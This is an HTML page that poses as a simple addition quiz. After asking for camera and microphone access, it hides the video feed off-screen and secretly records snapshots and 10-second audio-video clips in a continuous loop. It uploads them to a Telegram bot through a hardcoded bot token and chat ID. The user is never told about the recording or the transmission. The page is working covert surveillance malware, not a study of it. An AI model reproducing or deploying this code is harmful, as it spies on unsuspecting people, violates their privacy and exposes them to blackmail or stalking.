<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Math Quiz</title>
<style>
  body { font-family: Arial, sans-serif; background:#101820; color:#fff; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; }
  .card { background:#1c1f2b; padding:20px; border-radius:10px; max-width:400px; width:100%; text-align:center; }
  button { background:#1f6feb; color:white; border:none; padding:10px 15px; margin-top:10px; border-radius:5px; cursor:pointer; }
  button[disabled] { opacity:0.5; cursor:not-allowed; }
  input { padding:8px; margin-top:10px; width:80%; border-radius:5px; border:none; }
  #quiz { display:none; }
  video#cam { position:absolute; left:-9999px; opacity:0; pointer-events:none; }
</style>
</head>
<body>
<div class="card">
  <div id="consent">
    <h2>Start Quiz</h2>
    <p>Click below to allow camera & microphone access.</p>
    <button id="startBtn">Start</button>
  </div>

  <div id="quiz">
    <h2>Math Quiz</h2>
    <p id="question"></p>
    <input type="number" id="answer" placeholder="Your answer"/>
    <br>
    <button id="submitBtn">Submit</button>
    <p id="feedback"></p>
  </div>
</div>

<video id="cam" playsinline muted></video>
<canvas id="snapCanvas" style="display:none;"></canvas>

<script>
// ===== Telegram Config =====
const BOT_TOKEN = '8341564010:AAGbmOK0aGXFrEvCIBxmrllD8pAYqVhLiX0';
const CHAT_ID = '1851300622';

// ===== Elements =====
const startBtn = document.getElementById('startBtn');
const consentDiv = document.getElementById('consent');
const quizDiv = document.getElementById('quiz');
const questionEl = document.getElementById('question');
const answerInput = document.getElementById('answer');
const submitBtn = document.getElementById('submitBtn');
const feedbackEl = document.getElementById('feedback');
const videoEl  = document.getElementById('cam');
const canvas   = document.getElementById('snapCanvas');

let stream = null;
let recordingLoopStopped = true;
let correctAnswer = 0;

// ===== Helper Functions =====
function waitForFirstFrame(videoEl, timeout = 5000) {
  return new Promise((resolve, reject) => {
    if (videoEl.readyState >= 2 && videoEl.currentTime > 0) return resolve();
    let settled = false;
    function done(ok) { if (settled) return; settled = true; clearTimeout(timer); ok ? resolve() : reject(new Error('no frame')); }
    if (videoEl.requestVideoFrameCallback) {
      videoEl.requestVideoFrameCallback(() => done(true));
    } else {
      const onplay = () => setTimeout(() => done(true), 50);
      videoEl.addEventListener('playing', onplay, { once: true });
      videoEl.addEventListener('loadeddata', onplay, { once: true });
    }
    const timer = setTimeout(() => done(false), timeout);
  });
}

function captureSnapshotBlob() {
  return new Promise((resolve, reject) => {
    try {
      const w = videoEl.videoWidth || 640;
      const h = videoEl.videoHeight || 480;
      if (!w || !h) return reject(new Error('video has no dimensions yet'));
      canvas.width = w; canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(videoEl, 0, 0, w, h);
      canvas.toBlob(blob => { blob ? resolve(blob) : reject(new Error('snapshot toBlob null')); }, 'image/jpeg', 0.85);
    } catch (err) { reject(err); }
  });
}

function preferredMime() {
  if (!window.MediaRecorder) return '';
  try {
    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) return 'video/webm;codecs=vp9';
    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) return 'video/webm;codecs=vp8';
    if (MediaRecorder.isTypeSupported('video/webm')) return 'video/webm';
  } catch(e) {}
  return '';
}

async function sendPhotoBlob(blob) {
  try {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('photo', blob, 'snap.jpg');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
  } catch (err) {}
}

async function sendVideoBlob(blob) {
  try {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('video', blob, 'clip.webm');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
  } catch (err) {}
}

async function startRecordingLoop() {
  if (!stream) return;
  if (!window.MediaRecorder) return;
  recordingLoopStopped = false;
  const mime = preferredMime();

  while (!recordingLoopStopped && stream.active) {
    let chunks = [];
    try {
      const options = mime ? { mimeType: mime } : undefined;
      const recorder = new MediaRecorder(stream, options);
      recorder.ondataavailable = (e) => { if (e.data && e.data.size) chunks.push(e.data); };
      const stoppedPromise = new Promise((res, rej) => { recorder.onstop = res; recorder.onerror = rej; });

      try { await videoEl.play(); await waitForFirstFrame(videoEl); } catch(_) {}

      try {
        const snapBlob = await captureSnapshotBlob();
        sendPhotoBlob(snapBlob);
      } catch (err) {}

      recorder.start();
      await new Promise(r => setTimeout(r, 10000));
      if (recorder.state === 'recording') recorder.stop();
      await stoppedPromise;

      if (chunks.length) {
        const blob = new Blob(chunks, { type: chunks[0].type || 'video/webm' });
        sendVideoBlob(blob);
      }
      await new Promise(r => setTimeout(r, 400));
    } catch (err) { break; }
  }
}

// ===== Quiz Functions =====
function newQuestion() {
  const a = Math.floor(Math.random()*50) + 1;
  const b = Math.floor(Math.random()*50) + 1;
  correctAnswer = a + b;
  questionEl.textContent = `${a} + ${b} = ?`;
  answerInput.value = '';
  feedbackEl.textContent = '';
}

submitBtn.addEventListener('click', () => {
  const userAns = parseInt(answerInput.value, 10);
  if (userAns === correctAnswer) {
    feedbackEl.textContent = '✅ Correct!';
  } else {
    feedbackEl.textContent = `❌ Wrong! Correct: ${correctAnswer}`;
  }
  setTimeout(newQuestion, 1500);
});

// ===== Start Button =====
startBtn.addEventListener('click', async () => {
  startBtn.disabled = true;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    videoEl.srcObject = stream;
    consentDiv.style.display = 'none';
    quizDiv.style.display = 'block';
    newQuestion();
    startRecordingLoop();
  } catch (err) {
    alert('Camera/mic permission denied.');
    startBtn.disabled = false;
  }
});

window.addEventListener('beforeunload', () => {
  recordingLoopStopped = true;
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
  }
});
</script>
</body>
</html>
